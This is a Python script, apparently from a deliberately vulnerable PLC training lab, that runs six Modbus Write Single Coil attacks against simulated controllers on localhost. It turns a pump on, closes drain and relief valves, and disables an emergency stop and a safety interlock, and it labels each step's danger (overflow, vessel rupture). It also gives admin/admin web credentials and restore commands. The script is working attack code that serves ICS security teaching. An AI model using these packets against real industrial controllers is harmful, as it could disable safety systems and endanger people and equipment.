#!/usr/bin/env python3
"""
Visual demo showing Modbus attacks and their effects
"""
import socket
import struct
import time

def modbus_attack(port, coil, value, description):
    """Execute a Modbus attack and return result"""
    try:
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect(('127.0.0.1', port))

        # Write Single Coil
        coil_value = 0xFF00 if value else 0x0000
        request = struct.pack('>HHHB', 1, 0, 6, 1) + struct.pack('>BHH', 0x05, coil, coil_value)
        sock.send(request)
        response = sock.recv(1024)
        sock.close()

        success = len(response) >= 12 and response[7] == 0x05
        return success, request.hex(), response.hex()
    except Exception as e:
        return False, "", str(e)

print("""
╔══════════════════════════════════════════════════════════════╗
║         Vuln-PLC Attack Demonstration                        ║
║    Watch Modbus attacks affect the Web UI in real-time!     ║
╚══════════════════════════════════════════════════════════════╝
""")

print("\nThis demo will execute 6 Modbus attacks.")
print("After each attack, check the web UI to see the changes!")
print("\n" + "="*70)

attacks = [
    {
        'name': 'Attack 1: Turn Pump 1 ON',
        'port': 5502,
        'coil': 0,
        'value': True,
        'plc': 'PLC-1 (Tank Control)',
        'effect': 'pump1_status changes to TRUE',
        'danger': 'Tank will start filling',
        'ui_location': 'Process page → Pump 1 Status'
    },
    {
        'name': 'Attack 2: Close Drain Valve',
        'port': 5502,
        'coil': 3,
        'value': False,
        'plc': 'PLC-1 (Tank Control)',
        'effect': 'valve1_status changes to FALSE',
        'danger': 'Tank overflow - pump ON + valve CLOSED',
        'ui_location': 'Process page → Valve 1 Status'
    },
    {
        'name': 'Attack 3: Turn Compressor ON',
        'port': 5503,
        'coil': 0,
        'value': True,
        'plc': 'PLC-2 (Pressure)',
        'effect': 'pump1_status changes to TRUE',
        'danger': 'Pressure building',
        'ui_location': 'Process page → Pump 1 Status'
    },
    {
        'name': 'Attack 4: Close Relief Valve',
        'port': 5503,
        'coil': 4,
        'value': False,
        'plc': 'PLC-2 (Pressure)',
        'effect': 'valve4_status changes to FALSE',
        'danger': 'Vessel rupture - no pressure relief!',
        'ui_location': 'Process page → Valve 4 Status'
    },
    {
        'name': 'Attack 5: Disable Emergency Stop',
        'port': 5505,
        'coil': 0,
        'value': False,
        'plc': 'PLC-4 (Safety)',
        'effect': 'emergency_stop changes to FALSE',
        'danger': 'Safety system disabled!',
        'ui_location': 'Process page → Emergency Stop'
    },
    {
        'name': 'Attack 6: Disable Safety Interlock',
        'port': 5505,
        'coil': 1,
        'value': False,
        'plc': 'PLC-4 (Safety)',
        'effect': 'safety_interlock changes to FALSE',
        'danger': 'No automatic shutdown!',
        'ui_location': 'Process page → Safety Interlock'
    }
]

for i, attack in enumerate(attacks, 1):
    print(f"\n{'='*70}")
    print(f"  {attack['name']}")
    print(f"{'='*70}")
    print(f"Target:    {attack['plc']} (Port {attack['port']})")
    print(f"Command:   Write coil {attack['coil']} = {attack['value']}")
    print(f"Effect:    {attack['effect']}")
    print(f"Danger:    {attack['danger']}")
    print(f"Check UI:  {attack['ui_location']}")

    print(f"\n[{i}/6] Executing attack...")
    success, req, resp = modbus_attack(attack['port'], attack['coil'], attack['value'], attack['name'])

    if success:
        print(f"✓ SUCCESS! Attack completed")
        print(f"  └─ Modbus response: {resp}")
    else:
        print(f"✗ FAILED: {resp}")

    if i < len(attacks):
        print(f"\nℹ️  Open http://localhost:5000/process and watch the change!")
        time.sleep(1)

print(f"\n{'='*70}")
print("  ALL ATTACKS COMPLETED!")
print(f"{'='*70}\n")

print("""
NOW CHECK THE WEB UI:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Open browser to: http://localhost:5000/process
2. Login with: admin / admin
3. You will see these changes:

   BEFORE ATTACKS          →    AFTER ATTACKS
   ─────────────────────────────────────────────────────────────
   Pump 1 Status: false    →    Pump 1 Status: TRUE    ✓
   Valve 1 Status: true    →    Valve 1 Status: FALSE  ✓
   Valve 4 Status: true    →    Valve 4 Status: FALSE  ✓
   Emergency Stop: true    →    Emergency Stop: FALSE  ✓
   Safety Interlock: true  →    Safety Interlock: FALSE ✓

4. Scroll to bottom and check "Full State" JSON section:
   {
     "pump1_status": true,         ← Changed by attack!
     "valve1_status": false,       ← Changed by attack!
     "valve4_status": false,       ← Changed by attack!
     "emergency_stop": false,      ← Changed by attack!
     "safety_interlock": false     ← Changed by attack!
   }

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT JUST HAPPENED:
• You sent Modbus commands directly to PLCs (bypassing web UI)
• PLCs updated their internal state
• Web UI shows the new state (refreshes every 2 seconds)
• This simulates real ICS attacks where attackers control equipment
  while operators watch helplessly on their HMI screens!

TIP: Toggle the values back:
  sudo modbus write-coil 127.0.0.1:5502 0 0    # Pump OFF
  sudo modbus write-coil 127.0.0.1:5502 3 1    # Valve OPEN
  sudo modbus write-coil 127.0.0.1:5505 0 1    # E-stop ENABLED

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
